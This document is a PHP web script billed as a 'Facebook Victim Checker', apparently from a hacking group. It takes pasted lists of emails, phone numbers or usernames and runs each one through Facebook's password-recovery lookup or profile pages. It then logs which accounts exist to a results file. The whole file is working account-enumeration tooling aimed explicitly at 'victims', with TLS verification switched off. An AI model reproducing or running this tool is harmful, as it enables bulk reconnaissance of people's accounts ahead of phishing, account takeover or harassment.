 <?php 
# script title : Facebook  Victim Checker
# Author : Anonymoux Dz Team
# 06/11/2017
# Facebook : https://www.facebook.com/khelfatni
# Some Bug Fixed
# Gratz To alla Algeria Hackerz & Free Palastin <3
@set_time_limit(0);
error_reporting(0);
echo "
<head>
<link rel='icon' type='image/ico' href='http://www.albertpalacci.org/wp-content/uploads/2014/08/fb-relationships-full.png'/>
<title>Facebook Victim Checker</title>
<body>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Contact:  Fb.com/khelfatni </font></b></p></center>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded By : Anonymoux Dz team - ayman </font></b></p></center>
<form method='POST'>
</head>
<style>
textarea {
    background:#000000;
    resize:none;
    color: #00FF00 ;
    border:1px solid red ;
    border: 4px solid red ;
}
input {
    color: ##33CCFF;
    border:1px dotted #33CCFF;
    width: 20%;
}

html, body{
    
    background:#000000;
    color:#00FF00;
    font-family:monospace;
    height: 100%;
    text-decoration:  none;
}

</style>";
echo "
<center><span style='text-shadow: 0px 0px 10px red;'><font <font color='red' size='10'> check your victim facebook </font></span>

<p dir='ltr' align='center'>
<textarea cols='35' class='area'  rows='22' name='username'>Anonymoux Dz team </textarea> 
<br>
<br>
<input type='submit' name='scan' value='Start Scaning'><br></p>";
if(file_exists("Dzminou.html")){
        chmod("Dzminou.html",0755);
        unlink("Dzminou.html");
}
function saveresult($user,$result){
        $file = fopen("Dzminou.html","a");
        fwrite($file,"$result : $user <br>");
        fclose($file);
}
function brute_mail($mail){
    $data = array('lsd'=>'AVpNLmOr','charset_test'=>'€,´,€,´,水,Д,Є','email'=>trim($mail),'did_submit'=>'Search');
    $ch = curl_init();      
    curl_setopt($ch, CURLOPT_URL, "https://mbasic.facebook.com/login/identify/?ctx=recover");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
    $login = curl_exec($ch);
    if(preg_match("/Votre recherche ne donne aucu/",$login) or preg_match("/Your search did not return/",$login)){
         saveresult($mail,"Mail Not Found");
        echo "<a style='color:#ff0000;'>[-]Email Not found : $mail</a><br>";
    }else{
            saveresult($mail,"Mail Found");
        echo "<a style='color:#00ff00;'>[+]Email Found : </a><a href='https://www.facebook.com/search/top/?init=quick&q=".$mail."'> $mail</a><br>";
    
    }
}
function brute_phone($phone){
        $data = array('lsd'=>'AVpNLmOr','charset_test'=>'€,´,€,´,水,Д,Є','email'=>trim($phone),'did_submit'=>'Search');
    $ch = curl_init();      
    curl_setopt($ch, CURLOPT_URL, "https://mbasic.facebook.com/login/identify/?ctx=recover");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
    $login = curl_exec($ch);
    if(preg_match("/Votre recherche ne donne aucu/",$login) or preg_match("/Your search did not return/",$login)){
         saveresult($phone,"Phone Not Found");
        echo "<a style='color:#ff0000;'>[-]Phone Not found : $phone</a><br>";
    }else{
            saveresult($phone,"Phone Found");
        echo "<a style='color:#00ff00;'>[+]Phone Found : </a><a href='https://www.facebook.com/search/top/?init=quick&q=".$phone."'> $phone</a><br>";
    
    }
}
function brute($user,$url){
    $ch = curl_init();      
    curl_setopt($ch, CURLOPT_URL, $url."$user");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
    $login = curl_exec($ch);
    if(preg_match("/this page isn't available/",$login) or preg_match("/page n’est malheureusement pas disponible/",$login) or preg_match("/
     We couldn't find anything for/",$login) or preg_match("/Aucun résultat pour votre recherche/",$login)){
         saveresult($user,"Not Found");
        echo "<a style='color:#ff0000;'>[-]User Not found : $user</a><br>";
    }else{
            saveresult($user,"Found");
        echo "<a style='color:#00ff00;'>[+]User Found : </a><a href='https://facebook.com/".$user."'> $user </a><br>";
        
    
    }
}
if(isset($_POST['scan'])){
$username = explode("\n", $_POST['username']);
$i=0;
foreach($username as $users) {
    $users = @trim($users);    
    if(filter_var($users,FILTER_VALIDATE_EMAIL)){
     brute_mail($users); 
    }else if(is_numeric($users)){
         brute_phone($users); 
    }else{
        brute($users,"https://www.facebook.com/");
    }
    $i++;
    }
}
echo "<br><br><br>".$i." Accounts Scanned !";

echo"<br>
<style type='text/css'>
body {
background:

url('http://cdn-d4d.kxcdn.com/wp-content/uploads/2015/07/hacker_wallpapers-1.jpg') no-repeat center top,top left,top right;
<br>
<br>
<br>
"


?>